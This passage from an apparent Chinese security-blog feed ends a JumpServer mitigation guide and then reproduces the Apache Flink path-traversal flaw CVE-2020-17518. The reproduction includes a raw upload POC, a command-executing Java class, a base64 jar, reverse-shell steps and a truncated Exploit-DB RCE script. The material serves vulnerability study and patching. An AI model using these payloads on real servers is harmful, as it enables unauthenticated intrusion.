&#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">location &#x2F;api&#x2F;v1&#x2F;users&#x2F;connection-token&#x2F; &#123;</span><br><span class="line">   return 403;</span><br><span class="line">&#125;</span><br><span class="line">### 新增以上这些</span><br><span class="line"> </span><br><span class="line">location &#x2F;api&#x2F; &#123;</span><br><span class="line">    proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">    proxy_set_header Host $host;</span><br><span class="line">    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    proxy_pass http:&#x2F;&#x2F;core:8080;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>修改完成后重启 nginx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker方式: </span><br><span class="line">docker restart jms_nginx</span><br><span class="line"></span><br><span class="line">nginx方式:</span><br><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure><p><strong>修复验证</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_bug_check.sh </span><br><span class="line"></span><br><span class="line"># 使用方法 bash jms_bug_check.sh HOST </span><br><span class="line">$ bash jms_bug_check.sh demo.jumpserver.org</span><br><span class="line">漏洞已修复</span><br></pre></td></tr></table></figure><p><strong>入侵检测</strong></p><p>下载脚本到 jumpserver 日志目录，这个目录中存在 gunicorn.log，然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ pwd</span><br><span class="line">&#x2F;opt&#x2F;jumpserver&#x2F;core&#x2F;logs</span><br><span class="line"></span><br><span class="line">$ ls gunicorn.log </span><br><span class="line">gunicorn.log</span><br><span class="line"></span><br><span class="line">$ wget &#39;https:&#x2F;&#x2F;github.com&#x2F;jumpserver&#x2F;jumpserver&#x2F;releases&#x2F;download&#x2F;v2.6.2&#x2F;jms_check_attack.sh&#39;</span><br><span class="line">$ bash jms_check_attack.sh</span><br><span class="line">系统未被入侵</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw">https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞背景&quot;&gt;&lt;a href=&quot;#漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;漏洞背景&quot;&gt;&lt;/a&gt;漏洞背景&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;JumpServer&lt;/strong&gt; 是全球首款完全开源的堡垒机, 使用 GNU GPL v2.0 开源协</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>漏洞复现：CVE-2020-17518 Apache Flink 目录遍历漏洞</title>
    <link href="https://hack-for.fun/16e0.html"/>
    <id>https://hack-for.fun/16e0.html</id>
    <published>2021-01-18T07:37:00.000Z</published>
    <updated>2021-01-18T12:43:31.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h1><p>2021年01月06日，Apache Flink<code>发布了</code>Apache Flink 目录穿越漏洞,目录穿越漏洞<code>的风险通告，漏洞编号为</code>CVE-2020-17518,CVE-2020-17519<code>，漏洞等级：</code>高危，漏洞评分：8.5</p><p>远程攻击者通过<code>REST API</code>目录遍历，可造成<code>文件读取/写入</code>的影响。</p><h3 id="CVE-2020-17518-文件写入漏洞"><a href="#CVE-2020-17518-文件写入漏洞" class="headerlink" title="CVE-2020-17518: 文件写入漏洞"></a>CVE-2020-17518: 文件写入漏洞</h3><p>攻击者利用<code>REST API</code>，可以修改<code>HTTP</code>头，将上传的文件写入到本地文件系统上的任意位置（<code>Flink 1.5.1</code>进程能访问到的）。</p><h3 id="CVE-2020-17519-文件读取漏洞"><a href="#CVE-2020-17519-文件读取漏洞" class="headerlink" title="CVE-2020-17519: 文件读取漏洞"></a>CVE-2020-17519: 文件读取漏洞</h3><p>Apache Flink 1.11.0 允许攻击者通过<code>JobManager</code>进程的<code>REST API</code>读取<code>JobManager</code>本地文件系统上的任何文件（<code>JobManager</code>进程能访问到的） 。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><h3 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h3><p>–<code>Apache:Apache Flink</code>: 1.11.0, 1.11.1, 1.11.2</p><h3 id="CVE-2020-17519-1"><a href="#CVE-2020-17519-1" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h3><p>–<code>Apache:Apache Flink</code>: 1.5.1 – 1.11.2</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="CVE-2020-17518-任意文件写入漏洞"><a href="#CVE-2020-17518-任意文件写入漏洞" class="headerlink" title="CVE-2020-17518 任意文件写入漏洞"></a>CVE-2020-17518 任意文件写入漏洞</h2><p>验证POC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: x.x.x.x:8081</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.141 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;x.x.x.x:8081&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: jNj0_2132_ulastactivity&#x3D;94cd6XUujZO6Ir8Y402Py8R2hRo4k9SYYId68%2Bsj5Hj9wct3lwDn; jNj0_2132_lastcheckfeed&#x3D;1%7C1603631734</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 185</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194912.png"></p><h2 id="配合Apache-Flink-1-9-x-File-Upload-RCE-Unauthenticated-部署jar包来GetShell"><a href="#配合Apache-Flink-1-9-x-File-Upload-RCE-Unauthenticated-部署jar包来GetShell" class="headerlink" title="配合Apache Flink 1.9.x - File Upload RCE (Unauthenticated) 部署jar包来GetShell"></a>配合Apache Flink 1.9.x - File Upload RCE (Unauthenticated) 部署jar包来GetShell</h2><p>利用条件：</p><ul><li>Flink 1.9.x 版本</li><li>唯一优点：相比直接上传jar包，有了隐蔽性。</li></ul><blockquote><p>参考文章中，直接上传jsp，web目录下不解析，会作为文件下载。</p></blockquote><h3 id="准备Jar包"><a href="#准备Jar包" class="headerlink" title="准备Jar包"></a>准备Jar包</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Execute</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String o = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String cmd = args[<span class="number">0</span>];</span><br><span class="line">        ProcessBuilder p;</span><br><span class="line">        <span class="keyword">if</span> (System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            p = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String pty = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">new</span> File(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                pty = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = <span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;pty, <span class="string">&quot;-c&quot;</span>, cmd&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Process s = p.start();</span><br><span class="line">        Scanner c = (<span class="keyword">new</span> Scanner(s.getInputStream())).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">        c.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将源码进行编译并打包为jar包，</p><p>Base64之后的jar包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UEsDBBQAAAAIAASBJlLHe4y+9gIAAOgEAAANAAAARXhlY3V0ZS5jbGFzc21Uy1bUQBC9zTwSQnhFBEZ8gAoOCIwiKgKivEWGhwbRATaZ0AcCMwkmPQIbN&#x2F;oTfIFrNoNHjn6Av+MatToqLycn6UpX3Vt1q7uT7z+&#x2F;fAPQixUNTehQcVtFp4YudGsoR0rFHWnvKuhRcE9Fr4r7GlQ8UPFQQZ+KRxqq0C+HARWDMvRYwZCGJ3iqoQ7DKkakHZXDmIJxBRMM8UHHdcQQQyTZvsgQHfVWOUN12nH5bCGf5f6Clc1xCuQtx2WoTy6nN6x3VipnuWspU&#x2F;iOuzYgiZWmsOzNGWsrxJNABZOklEEb37H5lnA8N1DwjOamV&#x2F;BtPuHIrPr4DrcLgnfLnDou4woDGBQv6HatPKWZ0vEc0zrSmCGJ246rYxZzDI0nIuZ9z+ZBMFJwcqvcZ6g5r4&#x2F;y2fnVbr5DBctStizTQr5U1nFTwTqJCAmOl&#x2F;qjqTwMZK1gXSLndbzASyJ2EdHEAkNtCC8IJ5cybct1ua&#x2F;glY5FvJb4NwRdGdaRwZKOZdmP8rfHM8rmshvcFgwXSiwneU98x6t3trHdQPA8Q8UaF9T&#x2F;FvfFLkNbssTelMpfIby0t839USsgWXXJkiDV9lxBmx4wNJ1OPLpu+SZ&#x2F;W+CuzQfalxguJksfiTjfcQIRyKMlYbFAWL4g+Em5k92jerXnncSsov6m3K2CoLTcooYbiPxvu04FiN6YLBUIheiFgI&#x2F;xnJN3hDwgt0ou03+7Sjljds4LOFpwiT5IeZWByUNK41WatZBlZGMdB2D7kCf3Go0awciJKOL0vTYTrCyE&#x2F;6B5nOxHoyzdEemZMSKfES0iZsSLUPbQfAg1E&#x2F;+K8kzE0MxM1KgwM7FO8wD67Cf0GpX90UNUZYzqA9QUUbsHxagm1zEnEZUc45jTVcQFGa&#x2F;LJKjIxQPUGw1FNPbHErEiEvuymVBtD3QayxEh3Qq9N6CSfkHV6EMNJlGLafpbcPJuohHvkcAHWozrxGhF5Ai9Cm7QfYR6kPlF4aiCm&#x2F;Qa3q0Ea6MnClp0epJh0fbfUEsDBAoAAAgAACJ1bU8AAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALgAAAFBLAQI&#x2F;ABQAAAAIAASBJlLHe4y+9gIAAOgEAAANACQAAAAAAAAAIAAAAAAAAABFeGVjdXRlLmNsYXNzCgAgAAAAAAABABgAsQeXEAPk1gFyshItA+TWAdyLEi0D5NYBUEsBAgoACgAACAAAInVtTwAAAAAAAAAAAAAAAAkAAAAAAAAAAAAAAAAAIQMAAE1FVEEtSU5GL1BLAQIUABQACAgIACJ1bU+Iigi&#x2F;MAAAAC4AAAAUAAQAAAAAAAAAAAAAAEgDAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSwUGAAAAAAMAAwDcAAAAvgMAAAAA</span><br></pre></td></tr></table></figure><p>link运行时文件都在/tmp目录下，路径类似于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;flink-web-xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#x2F;</span><br></pre></td></tr></table></figure><p>每台服务器运行Flink时路径都不同，因此要先获取该路径。</p><p>通过接口<code> /jobmanager/config</code> 则可以获取<code>web.tmpdir</code>的路径。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194913.png"></p><p>我这里为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;flink-web-2dc398da-fb29-4250-b9ef-68afe0dd08ab</span><br></pre></td></tr></table></figure><p>上传jar包到<code>/tmp/flink-web-2dc398da-fb29-4250-b9ef-68afe0dd08ab/flink-web-upload/</code>目录下，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210118194914.png"></p><p>执行命令，反弹shell。</p><p>我手动复现了三次都没成功，用expdb里的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Apache Flink 1.9.x - File Upload RCE (Unauthenticated)</span></span><br><span class="line"><span class="comment"># Google Dork: None</span></span><br><span class="line"><span class="comment"># Date: 2020.11.01</span></span><br><span class="line"><span class="comment"># Exploit Author: bigger.wing</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://flink.apache.org/</span></span><br><span class="line"><span class="comment"># Software Link: https://flink.apache.org/downloads.html</span></span><br><span class="line"><span class="comment"># Version: 1.9.x</span></span><br><span class="line"><span class="comment"># Tested on: Centos7.x, 1.9.1</span></span><br><span class="line"><span class="comment"># CVE: None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlinkRCECheck</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, url</span>):</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.timeout = <span class="number">10</span></span><br><span class="line">        self.upload_file = <span class="string">&#x27;rce_check_from_sec.jar&#x27;</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &#x27;</span></span><br><span class="line">                          <span class="string">&#x27;Chrome/61.0 Safari/537.36&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_version</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url, headers=self.headers, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            version = res.json().get(<span class="string">&#x27;flink-version&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            version = <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> version</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_check</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;jars&#x27;</span>)</span><br><span class="line">        jar_list = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.get(url, headers=self.headers, verify=<span class="literal">False</span>, timeout=self.timeout)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;application/json&#x27;</span> <span class="keyword">in</span> res.headers.get(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;&#x27;</span>):</span><br><span class="line">                res = res.json()</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> res[<span class="string">&#x27;files&#x27;</span>]:</span><br><span class="line">                    <span class="keyword">if</span> file[<span class="string">&#x27;id&#x27;</span>].endswith(self.upload_file):</span><br><span class="line">                        jar_list.append(file[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> jar_list</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_upload</span>(<span class="params">self</span>):</span></span><br><span class="line">        url = <span class="string">&#x27;%s/%s&#x27;</span> % (self.url, <span class="string">&#x27;jars/upload&#x27;</span>)</span><br><span class="line">        jar_content = base64.b64decode(<span class="string">&#x27;UEsDBBQACAgIACJ1bU8AAAAAAAAAAAAAAAAUAAQATUVUQS1JTkYvTUFOSUZFU1QuTUb+ygAA803My&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;0xLLS7RDUstKs7Mz7NSMNQz4OXyTczM03XOSSwutlJwrUhNLi1J5eXi5QIAUEsHCIiKCL8wAAAALg&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAFBLAwQKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAE1FVEEtSU5GL1BLAwQUAAgICAAidW1PAAA&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAAAAAAAAAAADQAAAEV4ZWN1dGUuY2xhc3ONVet2E1UU/k4yyUwmQy+TQlsQBdSStqSxiIotIlAK&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;VkJbSa0G8DKZHpPTJjNhLjTVCvoQ/ugT8MsfqCtx0aUPwEOx3Gdo09KGtUzW7H3O3vvbt7PPzPMXz&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;/4FMIlfdbyDyxo+1XBFx1Vc05HCjIbrks+quKHipobPNMzp0PC5hlsqChpu6+jBvCQLGhal6gsVd3&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;QUsaRjAF9qWJb8K0m+lqQkyd0URbin4r6OkzLoN5J/K8l3Or6HpaKswmZIXhKOCC4zxLOjywzKjLv&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;CGXoLwuHzYb3MvSWrXCOJWXBtq7ZseULud4RKUBU+Q6ow2+R2GPBpEtUt4TAcy94rrFoPrXzNcir5&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;YuAJpzItA7AGw/F9qkXPtbnvXwtFbYV75CDeCDZkuENo8m15FQqX6eKaHLuEtesrtJI2h0NIG7ujC&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;QNRyxdty3GiqPps0+aNQLiOr4J86EU39Gx+Q8gyjZ3yJiTSwLsYYQCD6voTjlXnKriBH1AxUIWgJN&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;aFY2AVawxDr6uToe9gCeSPsp/gTQoYy9syTI5k+bJw8n6VkogAws2/zCkVKcqWX5WWNQN1UNtjOQK&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;6oB73H6pSxQMDHnxpH5Dp/asGQjw0sA7KtwlhYAMjBn7ETwyDB9PrJB7fvLJpYBM/G3gEoeKxgV9Q&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;o0x3mvRKaQvlVW5TsMyeqNPoV3uw4Qe8zpCu8IBa1eCenIKRbJch6nb46cAtuOvcm7F8SmAg29VIs&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;10noOmk8Tix3/FM1fKK/EHIHZtPj95lONotLM1ukjeFH/jRXSGzhB9YXiDNR7tOW/8hIUMP1TfnNM&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;KA3HKLCh7cBdPJ7lMQfCjbVSETMUKfX+c1UReBPJKzr2/TgTFXq5Y/z5uUtOJELGHXXNmyuBvKSjo&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;RF8nJXipJq9HgDl2L3P86kL3LrAXu7nRnurim+A25w2m8Te9G+YvRxaILRvQs7fLE6a4hMdYGexqp&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;s0STkZBhlKjx0gBjGCeewjnkyIrAbInskiT7y4wVxuLnb5vxv6G0kDCTLahbOLUNrZT8B6lS3NSLJ&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;cVMF0uJc8U2jPknuGAemVK20VMye9voa6F/C6rZK0W7mGFFYswOJtdCRuoHSsMU5Ggbx8zBFoamEs&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;OJFoa3kJb8+BMo4wW5OvEH3tjGyVIbb5pvtXBqnJ5o0cLpFs7s1fohjhCN01+BSvUMEr1AdV6Ejpt&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;I4xbpOXqxhj66kP34DSb+RCbqzR36WEwScoIaGSdEDu/RXpE9wXm8H/l9St4m5dsMv+MDWsXI28IO&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;Yg1zFP8jQjwifhEfU5+nCKWQ/TQ9l6IsP/kPUEsHCEEOnKXWAwAA4gYAAFBLAQIUABQACAgIACJ1b&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;U+Iigi/MAAAAC4AAAAUAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi9NQU5JRkVTVC5NRv7KAABQSw&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;ECCgAKAAAIAAAidW1PAAAAAAAAAAAAAAAACQAAAAAAAAAAAAAAAAB2AAAATUVUQS1JTkYvUEsBAhQ&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AFAAICAgAInVtT0EOnKXWAwAA4gYAAA0AAAAAAAAAAAAAAAAAnQAAAEV4ZWN1dGUuY2xhc3NQSwUG&#x27;</span></span><br><span class="line">                                       <span class="string">&#x27;AAAAAAMAAwC4AAAArgQAAAAA&#x27;</span>)</span><br><span class="line">        files = &#123;<span class="string">&#x27;jarfile&#x27;</span>: (self.upload_file, io.BytesIO(jar_content), <span class="string">&#x27;application/octet-stream&#x27;</span>)&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url, headers=self.headers, files=files, timeout=self.timeout, verify=<span class="literal">False</span>)</span><br><span class="line">            file_id = res.json()[<span class="string">&#x27;filename&#x27;</span>].split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">return</span> file_id</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="comment"># delete history jar packages</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jar_delete</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> jar_name <span class="keyword">in</span> self.jar_check:</span><br><span class="line">            url = <span class="string">&#x27;%s//jars/%s&#x27;</span> % (self.url, 